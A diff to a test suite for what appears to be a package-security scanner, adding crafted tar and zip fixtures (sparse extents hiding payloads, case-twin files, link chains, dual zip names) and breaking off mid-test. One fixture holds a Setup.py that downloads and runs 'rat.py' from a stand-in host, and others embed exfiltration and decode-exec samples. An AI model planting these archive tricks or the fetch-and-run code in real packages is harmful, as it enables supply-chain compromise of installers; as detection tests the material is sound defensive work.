@@ -20,9 +20,11 @@ installers do.
 
 import bz2
 import gzip
+import io
 import lzma
 import os
-import shutil
+import posixpath
+import struct
 import subprocess
 import tarfile
 import tempfile
@@ -32,9 +34,10 @@ import zlib
 from unittest import mock
 
 from lazaret.registry import repo
+from tests import _support
 from tests.registry._review_support import (
     DECODE_EXEC_JS, DECODE_EXEC_PY, EXFIL_JS, hooks, issues, manifest, rules, scan_bytes,
-    scan_wheel, tar_member, zipball)
+    scan_wheel, tar_member, unicode_path, zip_entries, zipball)
 
 HOOKED = hooks(postinstall="node index.js").encode()
 PAYLOAD = DECODE_EXEC_JS.encode()
@@ -54,17 +57,217 @@ def bad_checksum_tgz():
                          + tar_member("package/index.js", PAYLOAD) + b"\0" * 1024)
 
 
+def _pax_record(key, value):
+    body = f"{key}={value}\n".encode()
+    length = len(body) + 2
+    while True:
+        updated = len(body) + 1 + len(str(length))
+        if updated == length:
+            return str(length).encode() + b" " + body
+        length = updated
+
+
+def sparse_member(name, logical_size, payload):
+    """One valid PAX sparse-0.1 member: one stored extent at logical EOF."""
+    hole = logical_size - len(payload)
+    info = tarfile.TarInfo(name)
+    info.size = len(payload)
+    info.pax_headers = {"GNU.sparse.map": f"{hole},{len(payload)}",
+                        "GNU.sparse.size": str(logical_size)}
+    raw = info.tobuf(tarfile.PAX_FORMAT) + payload
+    return raw + b"\0" * (-len(raw) % tarfile.BLOCKSIZE) + b"\0" * 1024
+
+
+def tar_xz_with_dictionary_property(prop):
+    """A valid tiny tar.xz whose LZMA2 dictionary property is replaced."""
+    raw = tar_member("x-1.0/a.py", b"x = 1\n") + b"\0" * 1024
+    encoded = bytearray(lzma.compress(raw, format=lzma.FORMAT_XZ, preset=0))
+    assert encoded[12:16] == b"\x02\x00\x21\x01"
+    encoded[16] = prop
+    encoded[20:24] = struct.pack("<I", zlib.crc32(encoded[12:20]))
+    return bytes(encoded)
+
+
+def pax_metadata_archive(entries):
+    """A gzip tar containing (member name, raw local-PAX records) pairs."""
+    raw = b""
+    for number, (name, metadata) in enumerate(entries):
+        header = tarfile.TarInfo(f"././@PaxHeader{number}")
+        header.type, header.size = tarfile.XHDTYPE, len(metadata)
+        raw += header.tobuf(tarfile.USTAR_FORMAT)
+        raw += metadata + b"\0" * (-len(metadata) % tarfile.BLOCKSIZE)
+        raw += tar_member(name, b"x = 1\n")
+    return gzip.compress(raw + b"\0" * 1024)
+
+
+def oversized_pax_10_sparse_sdist(extents):
+    """A PAX 1.0 sparse member whose declared map is refused immediately."""
+    sparse_map = f"{extents}\n".encode()
+    sparse_map += b"\0" * (-len(sparse_map) % tarfile.BLOCKSIZE)
+    info = tarfile.TarInfo("placeholder")
+    info.size = len(sparse_map)
+    info.pax_headers = {
+        "GNU.sparse.major": "1",
+        "GNU.sparse.minor": "0",
+        "GNU.sparse.name": "x-1.0/setup.py",
+        "GNU.sparse.realsize": "1",
+    }
+    return gzip.compress(info.tobuf(tarfile.PAX_FORMAT) + sparse_map + b"\0" * 1024)
+
+
+def long_pax_10_sparse_sdist(extents, digits=256):
+    """A valid maximum-width PAX 1.0 map that exposes quadratic line splitting."""
+    zero = "0" * digits
+    sparse_map = (f"{extents}\n" + (f"{zero}\n{zero}\n" * extents)).encode()
+    sparse_map += b"\0" * (-len(sparse_map) % tarfile.BLOCKSIZE)
+    info = tarfile.TarInfo("placeholder")
+    info.size = len(sparse_map)
+    info.pax_headers = {
+        "GNU.sparse.major": "1",
+        "GNU.sparse.minor": "0",
+        "GNU.sparse.name": "x-1.0/setup.py",
+        "GNU.sparse.realsize": "0",
+    }
+    return gzip.compress(info.tobuf(tarfile.PAX_FORMAT) + sparse_map + b"\0" * 1024)
+
+
+def pax_10_sparse_lines(*lines):
+    """A PAX 1.0 sparse member with the exact numeric lines supplied."""
+    sparse_map = ("\n".join(lines) + "\n").encode()
+    sparse_map += b"\0" * (-len(sparse_map) % tarfile.BLOCKSIZE)
+    info = tarfile.TarInfo("placeholder")
+    info.size = len(sparse_map)
+    info.pax_headers = {
+        "GNU.sparse.major": "1",
+        "GNU.sparse.minor": "0",
+        "GNU.sparse.name": "x-1.0/setup.py",
+        "GNU.sparse.realsize": "0",
+    }
+    return gzip.compress(info.tobuf(tarfile.PAX_FORMAT) + sparse_map + b"\0" * 1024)
+
+
+def old_gnu_sparse_sdist(extension_blocks):
+    """An old-GNU sparse member with empty chained extension blocks."""
+    info = tarfile.TarInfo("x-1.0/setup.py")
+    info.type, info.size = tarfile.GNUTYPE_SPARSE, 1
+    header = bytearray(info.tobuf(tarfile.GNU_FORMAT))
+    header[482] = 1 if extension_blocks else 0
+    header[483:495] = tarfile.itn(1, 12, tarfile.GNU_FORMAT)
+    header[148:156] = b"        "
+    checksum = tarfile.calc_chksums(header)[0]
+    header[148:156] = bytes(f"{checksum:06o}\0 ", "ascii")
+    extensions = []
+    for number in range(extension_blocks):
+        block = bytearray(tarfile.BLOCKSIZE)
+        block[504] = number + 1 < extension_blocks
+        extensions.append(bytes(block))
+    raw = bytes(header) + b"".join(extensions) + b"x" + b"\0" * 511 + b"\0" * 1024
+    return gzip.compress(raw)
+
+
+def overlapping_sparse_sdist(sparse_format, first, second):
+    """setup.py whose two sparse extents cover the same complete file."""
+    assert len(first) == len(second)
+    size, physical = len(first), first + second
+    if sparse_format == "pax-0.1":
+        info = tarfile.TarInfo("x-1.0/setup.py")
+        info.size = len(physical)
+        info.pax_headers = {"GNU.sparse.map": f"0,{size},0,{size}",
+                            "GNU.sparse.size": str(size)}
+        raw = info.tobuf(tarfile.PAX_FORMAT) + physical
+    elif sparse_format == "pax-0.0":
+        records = b"".join((_pax_record("GNU.sparse.offset", 0),
+                            _pax_record("GNU.sparse.numbytes", size),
+                            _pax_record("GNU.sparse.offset", 0),
+                            _pax_record("GNU.sparse.numbytes", size),
+                            _pax_record("GNU.sparse.size", size)))
+        header = tarfile.TarInfo("././@PaxHeader")
+        header.type, header.size = tarfile.XHDTYPE, len(records)
+        info = tarfile.TarInfo("x-1.0/setup.py")
+        info.size = len(physical)
+        raw = (header.tobuf(tarfile.USTAR_FORMAT) + records + b"\0" * (-len(records) % 512)
+               + info.tobuf(tarfile.USTAR_FORMAT) + physical)
+    elif sparse_format == "pax-1.0":
+        sparse_map = f"2\n0\n{size}\n0\n{size}\n".encode()
+        sparse_map += b"\0" * (-len(sparse_map) % 512)
+        info = tarfile.TarInfo("placeholder")
+        info.size = len(sparse_map) + len(physical)
+        info.pax_headers = {"GNU.sparse.major": "1", "GNU.sparse.minor": "0",
+                            "GNU.sparse.name": "x-1.0/setup.py", "GNU.sparse.realsize": str(size)}
+        raw = info.tobuf(tarfile.PAX_FORMAT) + sparse_map + physical
+    else:
+        info = tarfile.TarInfo("x-1.0/setup.py")
+        info.type, info.size = tarfile.GNUTYPE_SPARSE, len(physical)
+        header = bytearray(info.tobuf(tarfile.GNU_FORMAT))
+        for offset, value in ((386, 0), (398, size), (410, 0), (422, size),
+                              (434, 0), (446, 0), (458, 0), (470, 0), (483, size)):
+            header[offset:offset + 12] = tarfile.itn(value, 12, tarfile.GNU_FORMAT)
+        header[482] = 0
+        header[148:156] = b"        "
+        checksum = tarfile.calc_chksums(header)[0]
+        header[148:156] = bytes(f"{checksum:06o}\0 ", "ascii")
+        raw = bytes(header) + physical
+    raw += b"\0" * (-len(raw) % 512) + b"\0" * 1024
+    return gzip.compress(raw)
+
+
+def zero_length_sparse_sdist(sparse_format, prefix, payload):
+    """setup.py whose zero-width marker hides the later payload from extractfile()."""
+    size, physical = len(prefix) + len(payload), prefix + payload
+    extents = ((0, len(prefix)), (size, 0), (len(prefix), len(payload)))
+    if sparse_format == "pax-0.1":
+        info = tarfile.TarInfo("x-1.0/setup.py")
+        info.size = len(physical)
+        info.pax_headers = {
+            "GNU.sparse.map": ",".join(str(value) for extent in extents for value in extent),
+            "GNU.sparse.size": str(size),
+        }
+        raw = info.tobuf(tarfile.PAX_FORMAT) + physical
+    elif sparse_format == "pax-0.0":
+        records = b"".join(
+            record
+            for offset, length in extents
+            for record in (_pax_record("GNU.sparse.offset", offset),
+                           _pax_record("GNU.sparse.numbytes", length))
+        ) + _pax_record("GNU.sparse.size", size)
+        header = tarfile.TarInfo("././@PaxHeader")
+        header.type, header.size = tarfile.XHDTYPE, len(records)
+        info = tarfile.TarInfo("x-1.0/setup.py")
+        info.size = len(physical)
+        raw = (header.tobuf(tarfile.USTAR_FORMAT) + records + b"\0" * (-len(records) % 512)
+               + info.tobuf(tarfile.USTAR_FORMAT) + physical)
+    elif sparse_format == "pax-1.0":
+        fields = [str(len(extents))]
+        fields.extend(str(value) for extent in extents for value in extent)
+        sparse_map = ("\n".join(fields) + "\n").encode()
+        sparse_map += b"\0" * (-len(sparse_map) % 512)
+        info = tarfile.TarInfo("placeholder")
+        info.size = len(sparse_map) + len(physical)
+        info.pax_headers = {"GNU.sparse.major": "1", "GNU.sparse.minor": "0",
+                            "GNU.sparse.name": "x-1.0/setup.py",
+                            "GNU.sparse.realsize": str(size)}
+        raw = info.tobuf(tarfile.PAX_FORMAT) + sparse_map + physical
+    else:
+        info = tarfile.TarInfo("x-1.0/setup.py")
+        info.type, info.size = tarfile.GNUTYPE_SPARSE, len(physical)
+        header = bytearray(info.tobuf(tarfile.GNU_FORMAT))
+        for number in range(4):
+            offset, length = extents[number] if number < len(extents) else (0, 0)
+            at = 386 + number * 24
+            header[at:at + 12] = tarfile.itn(offset, 12, tarfile.GNU_FORMAT)
+            header[at + 12:at + 24] = tarfile.itn(length, 12, tarfile.GNU_FORMAT)
+        header[482] = 0
+        header[483:495] = tarfile.itn(size, 12, tarfile.GNU_FORMAT)
+        header[148:156] = b"        "
+        checksum = tarfile.calc_chksums(header)[0]
+        header[148:156] = bytes(f"{checksum:06o}\0 ", "ascii")
+        raw = bytes(header) + physical
+    raw += b"\0" * (-len(raw) % 512) + b"\0" * 1024
+    return gzip.compress(raw)
+
+
 def _node_tar():
-    node = shutil.which("node")
-    if not node:
-        return None, None
-    out = subprocess.run([node, "-e", "console.log(require.resolve('npm/package.json'))"],
-                         capture_output=True, text=True, env=dict(os.environ, NODE_PATH=os.path.join(
-                             os.path.dirname(os.path.dirname(os.path.realpath(node))), "lib", "node_modules")), encoding="utf-8", errors="replace")
-    if out.returncode != 0:
-        return node, None
-    tar = os.path.join(os.path.dirname(out.stdout.strip()), "node_modules", "tar")
-    return node, tar if os.path.isdir(tar) else None
+    return _support.npm_node_tar()                  # (npm's own, found through PATH: MAC-TESTS)
 
 
 class TarStructureTests(unittest.TestCase):
@@ -168,6 +371,105 @@ class PathTests(unittest.TestCase):
                          [("index.js", "MAJOR")])
         self.assertEqual(res["verdict"], "WARN")
 
+    def test_paths_that_differ_only_by_case(self):
+        # EG-4: on macOS and Windows the later entry is written over the earlier, under its name: the main file
+        # runs the twin's bytes there, so the twin gets the import-time test too
+        raw = (tar_member("package/package.json", manifest(main="index.js"))
+               + tar_member("package/index.js", "module.exports = 1;\n")
+               + tar_member("package/INDEX.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual({i["file"] for i in issues(res, "SC-IMPORT-RISK")}, {"INDEX.js"})
+        case = [i for i in issues(res, "SC-ARCHIVE-DUP") if i["name"] == "Archive paths that differ only by case"]
+        self.assertEqual([(i["file"], i["sev"]) for i in case], [("INDEX.js", "MAJOR")])
+        self.assertIn("'index.js'", case[0]["msg"])
+        # Unicode normalization too (macOS's file systems ignore it): é composed, then decomposed
+        raw = (tar_member("package/package.json", manifest()) + tar_member("package/caf\u00e9.js", "1;\n")
+               + tar_member("package/cafe\u0301.js", "2;\n") + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(len([i for i in issues(res, "SC-ARCHIVE-DUP")
+                              if i["name"] == "Archive paths that differ only by case"]), 1)
+        self.assertEqual(repo.case_fold("Lib/CAF\u00c9.JS"), repo.case_fold("lib/cafe\u0301.js"))
+
+    def test_the_fold_is_the_same_on_every_python(self):
+        # BR-2: the fold is the engine's, on its Unicode 13.0 (Python 3.10's), not the host Python's: Glagolitic's
+        # caudate chri (U+2C2F and U+2C5F, from Unicode 14.0) folded together on 3.11 and later and not on 3.10, so
+        # the same release had a case pair on one and none on the other. Neither has one now; the full folds are
+        # the same as before (ß and ẞ to ss, ς and Σ to σ, ﬃ to ffi)
+        raw = (tar_member("package/package.json", manifest()) + tar_member("package/x\u2c2f.js", "1;\n")
+               + tar_member("package/x\u2c5f.js", "2;\n") + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual([i["file"] for i in issues(res, "SC-ARCHIVE-DUP")], [])
+        self.assertNotEqual(repo.case_fold("x\u2c2f.js"), repo.case_fold("x\u2c5f.js"))
+        self.assertEqual(repo.case_fold("Stra\u00dfe.JS"), "strasse.js")
+        self.assertEqual(repo.case_fold("\u1e9e/\u03c2/\ufb03"), repo.case_fold("SS/\u03a3/FFI"))
+        self.assertEqual(repo.case_fold("\udc80A.js"), "\udc80a.js")         # (a name read with surrogateescape)
+
+    def test_a_case_twin_of_the_manifest_is_read_as_the_manifest(self):
+        # EG-4's leftover: on macOS and Windows, Package.json written after package.json is the package.json npm
+        # reads there: its install hook runs, and what its main names is an entry
+        raw = (tar_member("package/package.json", manifest(main="index.js"))
+               + tar_member("package/Package.json", manifest(main="lib/real.js", scripts={"postinstall": "node setup.js"}))
+               + tar_member("package/index.js", "module.exports = 1;\n")
+               + tar_member("package/lib/real.js", EXFIL_JS)
+               + tar_member("package/setup.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("Package.json", "CRITICAL")])
+        self.assertIn("lib/real.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+        # (one written alone under another case is opened as package.json there too; nested ones are read as nested)
+        raw = (tar_member("package/PACKAGE.JSON", hooks(install="node setup.js"))
+               + tar_member("package/setup.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("PACKAGE.JSON", "CRITICAL")])
+
+    def test_a_path_node_opens_under_another_case(self):
+        # EG-4's leftover: on macOS and Windows `node Setup.js` runs setup.js, and require('./Lib/Core') loads
+        # lib/core.js (where the exact name is not there: on Linux they fail)
+        raw = (tar_member("package/package.json", manifest(main="index.js", scripts={"postinstall": "node Setup.js"}))
+               + tar_member("package/setup.js", EXFIL_JS)
+               + tar_member("package/index.js", "module.exports = require('./Lib/Core');\n")
+               + tar_member("package/lib/core.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("package.json", "CRITICAL")])
+        self.assertIn("Install hook runs Setup.js, which", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        self.assertIn("lib/core.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+
+    def test_node_tries_each_name_under_any_case_before_the_next(self):
+        # EG-9: `node Setup` tries Setup, then Setup.js, then Setup.json; on macOS and Windows Setup.js opens setup.js,
+        # so that runs, though Setup.json is there under its exact name (on Linux, Setup.json would be read); and a
+        # folder's package.json under another case names its main there too
+        raw = (tar_member("package/package.json", manifest(main="index.js", scripts={"postinstall": "node Setup"}))
+               + tar_member("package/Setup.json", '{"a": 1}\n')
+               + tar_member("package/setup.js", EXFIL_JS)
+               + tar_member("package/index.js", "module.exports = require('./lib');\n")
+               + tar_member("package/lib/Package.json", '{"main": "core.js"}\n')
+               + tar_member("package/lib/core.js", EXFIL_JS) + b"\0" * 1024)
+        res = scan_bytes(gzip.compress(raw))
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertIn("Install hook runs Setup, which", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("package.json", "CRITICAL")])
+        self.assertIn("lib/core.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
+
+    def test_a_case_variant_of_setup_py_or_pyproject_is_run_by_pip(self):
+        # EG-4's leftover: pip opens setup.py where case is ignored, and so Setup.py; and a pyproject.toml's backend
+        def sdist(*members):
+            return gzip.compress(b"".join(tar_member("x-1.0/" + n, d) for n, d in members) + b"\0" * 1024)
+        pkg_info = ("PKG-INFO", "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n")
+        run = ("import requests, subprocess, sys\nr = requests.get('https://cdn.invalid/rat.py')\n"
+               "with open('rat.py', 'wb') as f:\n    f.write(r.content)\nsubprocess.check_call([sys.executable, 'rat.py'])\n")
+        res = scan_bytes(sdist(pkg_info, ("setup.py", "from setuptools import setup\nsetup()\n"), ("Setup.py", run)),
+                         artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("Setup.py", "CRITICAL")])
+        self.assertIn("Setup.py runs when pip builds or installs this sdist", issues(res, "SC-INSTALL-HOOK")[0]["msg"])
+        backend = '[build-system]\nrequires = []\nbuild-backend = "hooks"\nbackend-path = ["_build"]\n'
+        res = scan_bytes(sdist(pkg_info, ("PyProject.toml", backend), ("_build/hooks.py", run)),
+                         artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-INSTALL-HOOK")], [("_build/hooks.py", "CRITICAL")])
+
     def test_traversal_entry_is_flagged_not_scanned(self):
         raw = (tar_member("package/index.js", "1;\n") + tar_member("package/../evil.js", PAYLOAD)
                + b"\0" * 1024)
@@ -185,6 +487,21 @@ class LinkTests(unittest.TestCase):
                + tar_member("x-1.0/setup.py", b"", kind, linkname) + b"\0" * 1024)
         return gzip.compress(raw)
 
+    def chain_sdist(self, kind, entry="setup.py", intermediates=9, payload=None):
+        payload = self.NOTES if payload is None else payload
+        root = "x-1.0/"
+        raw = (tar_member(root + "PKG-INFO", b"Metadata-Version: 2.1\nName: x\nVersion: 1.0\n")
+               + tar_member(root + "docs/payload.txt", payload))
+        names = [entry] + [f"a{number}.txt" for number in range(1, intermediates + 1)]
+        pairs = list(zip(names, names[1:] + ["docs/payload.txt"]))
+        if kind == tarfile.LNKTYPE:
+            pairs.reverse()                         # each hard-link target exists when pip extracts it
+        for name, target in pairs:
+            linkname = (posixpath.relpath(target, posixpath.dirname(name) or ".")
+                        if kind == tarfile.SYMTYPE else root + target)
+            raw += tar_member(root + name, b"", kind, linkname)
+        return gzip.compress(raw + b"\0" * 1024)
+
     def test_hardlinked_setup_py_is_scanned(self):
         res = scan_bytes(self.sdist(tarfile.LNKTYPE, "x-1.0/docs/notes.txt"), artifact="sdist", eco="pypi")
         self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
@@ -194,6 +511,118 @@ class LinkTests(unittest.TestCase):
         res = scan_bytes(self.sdist(tarfile.SYMTYPE, "docs/notes.txt"), artifact="sdist", eco="pypi")
         self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
         self.assertIn("setup.py", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})
+
+    def test_link_targets_come_from_the_bounded_first_pass(self):
+        with mock.patch.object(repo.tarfile, "open",
+                               side_effect=AssertionError("link resolution reopened the tar")):
+            members = list(repo.iter_archive(
+                self.sdist(tarfile.SYMTYPE, "docs/notes.txt"), "tgz", "sdist"))
+        linked = [m for m in members if m[0] == "setup.py" and m[3] is None]
+        self.assertEqual([bytes(m[2]) for m in linked], [self.NOTES])
+
+    def test_a_link_target_past_the_retention_bound_fails_closed(self):
+        root = "x-1.0/"
+        filler = b"filler"
+        raw = (tar_member(root + "docs/filler.txt", filler)
+               + tar_member(root + "docs/notes.txt", self.NOTES)
+               + tar_member(root + "setup.py", b"", tarfile.SYMTYPE, "docs/notes.txt")
+               + b"\0" * 1024)
+        with mock.patch.object(repo, "MAX_TAR_LINK_CACHE", len(filler)):
+            members = list(repo.iter_archive(gzip.compress(raw), "tgz", "sdist"))
+        linked = [m for m in members if m[0] == "setup.py"]
+        self.assertEqual([(m[3], "not retained" in m.detail) for m in linked], [("total", True)])
+
+    def test_an_oversized_link_with_different_name_checks_is_incomplete(self):
+        root = "x-1.0/"
+        payload = b"import os\n" + b"#" * (repo.MAX_MEMBER + 1 - len(b"import os\n"))
+        raw = (tar_member(root + "blob.dat", payload)
+               + tar_member(root + "evil.pth", b"", tarfile.SYMTYPE, "blob.dat")
+               + b"\0" * 1024)
+        result = scan_bytes(gzip.compress(raw), artifact="sdist", eco="pypi")
+        self.assertEqual(result["verdict"], "INCOMPLETE", result["issues"])
+        self.assertIn("SC-TRUNCATED", rules(result))
+
+    def test_a_forward_symlink_uses_the_later_target(self):
+        root = "x-1.0/"
+        raw = (tar_member(root + "setup.py", b"", tarfile.SYMTYPE, "payload.py")
+               + tar_member(root + "payload.py", self.NOTES) + b"\0" * 1024)
+        members = list(repo.iter_archive(gzip.compress(raw), "tgz", "sdist"))
+        linked = [m for m in members if m[0] == "setup.py" and m[3] is None]
+        self.assertEqual([bytes(m[2]) for m in linked], [self.NOTES])
+
+    def test_hard_and_symbolic_links_choose_the_installers_duplicate(self):
+        root = "x-1.0/"
+        first, last = b"first = 1\n", b"last = 2\n"
+        for kind, expected in ((tarfile.LNKTYPE, first), (tarfile.SYMTYPE, last)):
+            with self.subTest(kind=kind):
+                target = root + "payload.py" if kind == tarfile.LNKTYPE else "payload.py"
+                raw = (tar_member(root + "payload.py", first)
+                       + tar_member(root + "setup.py", b"", kind, target)
+                       + tar_member(root + "payload.py", last) + b"\0" * 1024)
+                members = list(repo.iter_archive(gzip.compress(raw), "tgz", "sdist"))
+                linked = [m for m in members if m[0] == "setup.py" and m[3] is None]
+                self.assertEqual([bytes(m[2]) for m in linked], [expected])
+
+    def test_sparse_link_target_is_cached_as_installed_with_holes(self):
+        root, payload, logical_size = "x-1.0/", b"tail\n", 4096
+        hole = logical_size - len(payload)
+        info = tarfile.TarInfo(root + "payload.py")
+        info.size = len(payload)
+        info.pax_headers = {"GNU.sparse.map": f"{hole},{len(payload)}",
+                            "GNU.sparse.size": str(logical_size)}
+        sparse = info.tobuf(tarfile.PAX_FORMAT) + payload
+        sparse += b"\0" * (-len(sparse) % tarfile.BLOCKSIZE)
+        raw = (sparse + tar_member(root + "setup.py", b"", tarfile.SYMTYPE, "payload.py")
+               + b"\0" * 1024)
+        members = list(repo.iter_archive(gzip.compress(raw), "tgz", "sdist"))
+        linked = [m for m in members if m[0] == "setup.py" and m[3] is None]
+        self.assertEqual(len(linked), 1)
+        self.assertEqual(bytes(linked[0][2]), b"\0" * hole + payload)
+
+    def test_cargo_link_uses_bytes_from_an_odd_type_entry(self):
+        root = "x-1.0.0/"
+        disguised = tar_member(root + "fake-header.rs", b"decoy\n")
+        raw = (typed_member(root + "payload.rs", disguised, tarfile.CHRTYPE)
+               + tar_member(root + "build.rs", b"", tarfile.LNKTYPE, root + "payload.rs")
+               + b"\0" * 1024)
+        members = list(repo.iter_archive(gzip.compress(raw), "tgz", "crate"))
+        linked = [m for m in members if m[0] == "build.rs" and m[3] is None]
+        self.assertEqual([bytes(m[2]) for m in linked], [disguised])
+
+    def test_long_link_chains_are_fully_resolved(self):
+        for kind in (tarfile.SYMTYPE, tarfile.LNKTYPE):
+            for intermediates in (8, 9):             # both sides of the former eight-hop boundary
+                with self.subTest(kind=kind, intermediates=intermediates):
+                    data = self.chain_sdist(kind, intermediates=intermediates)
+                    res = scan_bytes(data, artifact="sdist", eco="pypi")
+                    self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+                    self.assertIn("setup.py", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})
+
+    def test_long_chains_preserve_every_installer_visible_name(self):
+        for kind in (tarfile.SYMTYPE, tarfile.LNKTYPE):
+            for entry in ("setup.py", "pyproject.toml", "docs/copy.txt"):
+                with self.subTest(kind=kind, entry=entry):
+                    data = self.chain_sdist(kind, entry=entry)
+                    members = list(repo.iter_archive(data, "tgz", "sdist"))
+                    linked = [m for m in members if m[0] == entry and m[3] is None]
+                    self.assertEqual([bytes(m[2]) for m in linked], [self.NOTES])
+
+    def test_cycle_and_dangling_target_are_explicitly_incomplete(self):
+        root = "x-1.0/"
+        metadata = tar_member(root + "PKG-INFO", b"Metadata-Version: 2.1\nName: x\nVersion: 1.0\n")
+        cases = {
+            "cycle": (tar_member(root + "setup.py", b"", tarfile.SYMTYPE, "a.txt")
+                      + tar_member(root + "a.txt", b"", tarfile.SYMTYPE, "setup.py")),
+            "dangling": tar_member(root + "setup.py", b"", tarfile.SYMTYPE, "missing.txt"),
+        }
+        for name, links in cases.items():
+            with self.subTest(name=name):
+                data = gzip.compress(metadata + links + b"\0" * 1024)
+                members = list(repo.iter_archive(data, "tgz", "sdist"))
+                self.assertTrue(any(m[0] == "setup.py" and m[3] == "corrupt" for m in members), members)
+                res = scan_bytes(data, artifact="sdist", eco="pypi")
+                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+                self.assertIn("SC-TRUNCATED", rules(res))
 
     def test_links_out_of_the_archive_are_flagged(self):
         for kind, target in ((tarfile.SYMTYPE, "../../../etc/passwd"), (tarfile.SYMTYPE, "/etc/passwd"),
@@ -227,6 +656,361 @@ class LinkTests(unittest.TestCase):
         link = issues(res, "SC-ARCHIVE-LINK")
         self.assertEqual([(i["file"], i["sev"]) for i in link], [("x/helper.py", "MAJOR")])
         self.assertIn("Zip entry marked as a symlink", link[0]["msg"])
+
+
+class UnicodePathTests(unittest.TestCase):
+    """A zip entry's Info-ZIP Unicode Path field (0x7075) names it again (the review of Oct 7). zipfile reads it from
+    Python 3.12, so pip installs the entry under the field's name there and under its header's before; yauzl (VS
+    Code's reader) reads it too. Lazaret reads both names on every Python."""
+
+    PTH = "import os; os.system('true')\n"
+
+    def wheel(self, extra, header="x/notes.txt"):
+        return zip_entries([("x/__init__.py", "", b""), (header, self.PTH, extra)])
+
+    def test_the_names_an_entry_goes_by(self):
+        import zipfile
+        data = zip_entries([("x/notes.txt", "", unicode_path("x/notes.txt", "x.pth")),
+                            ("x/a.txt", "", unicode_path("x/a.txt", "x/b.txt", crc=7)),
+                            ("x/c.txt", "", b""),
+                            ("x/d\x01.txt", "", b"")])
+        with zipfile.ZipFile(io.BytesIO(data)) as zf:
+            names = [repo.zip_entry_names(i) for i in zf.infolist()]
+        self.assertEqual(names, [("x/notes.txt", "x.pth", True, "x.pth", None),
+                                 ("x/a.txt", "x/a.txt", False, "x/a.txt", None),
+                                 ("x/c.txt", "x/c.txt", False, "x/c.txt", None),
+                                 ("x/d\x01.txt", "x/d\u263a.txt", False, "x/d\x01.txt", None)])
+
+    def test_a_wheel_entry_pip_installs_under_another_name_from_python_3_12(self):
+        res = scan_bytes(self.wheel(unicode_path("x/notes.txt", "x.pth")), container="zip", artifact="wheel",
+                         eco="pypi")
+        self.assertIn("x.pth", {i["file"] for i in issues(res, "SC-PTH-EXEC")})
+        two = [i for i in issues(res, "SC-ARCHIVE-PATH") if i["name"] == "Archive entry with two names"]
+        self.assertEqual([(i["file"], i["sev"]) for i in two], [("x.pth", "MAJOR")])
+        self.assertIn("'x/notes.txt'", two[0]["msg"])
+        # an entry whose header has no name, which a field names (it used to be passed over as nameless)
+        res = scan_bytes(self.wheel(unicode_path("", "x.pth"), header=""), container="zip", artifact="wheel",
+                         eco="pypi")
+        self.assertIn("x.pth", {i["file"] for i in issues(res, "SC-PTH-EXEC")})
+        # a zip sdist too (pip extracts it with zipfile)
+        sdist = zip_entries([("x-1.0/PKG-INFO", "Name: x\n", b""),
+                             ("x-1.0/docs/notes.txt", DECODE_EXEC_PY, unicode_path("x-1.0/docs/notes.txt",
+                                                                                   "x-1.0/setup.py"))])
+        res = scan_bytes(sdist, container="zip", artifact="sdist", eco="pypi")
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertIn("setup.py", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})
+
+    def test_a_field_that_does_not_apply_is_not_read(self):
+        for extra in (unicode_path("x/notes.txt", "x.pth", crc=7), unicode_path("x/notes.txt", "x.pth", version=2),
+                      unicode_path("x/notes.txt", "")):
+            with self.subTest(extra=extra):
+                res = scan_bytes(self.wheel(extra), container="zip", artifact="wheel", eco="pypi")
+                self.assertEqual(res["verdict"], "OK", res["issues"])
+
+    def test_a_field_zipfile_from_python_3_12_refuses_is_incomplete(self):
+        # pip from Python 3.12 installs nothing of the wheel, and Lazaret there reads none of it: INCOMPLETE on
+        # every Python
+        short = b"\x75\x70\x03\x00\x01\x00\x00"
+        for extra in (short, unicode_path("x/notes.txt", b"x\xff.pth")):
+            with self.subTest(extra=extra):
+                res = scan_bytes(self.wheel(extra), container="zip", artifact="wheel", eco="pypi")
+                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+
+    def test_a_go_module_zip_is_read_by_its_header_names(self):
+        # Go's archive/zip reads no Unicode Path field
+        data = zip_entries([("example.com/m@v1.0.0/go.mod", "module example.com/m\n", b""),
+                            ("example.com/m@v1.0.0/notes.txt", "", unicode_path("example.com/m@v1.0.0/notes.txt",
+                                                                                "example.com/m@v1.0.0/x.go"))])
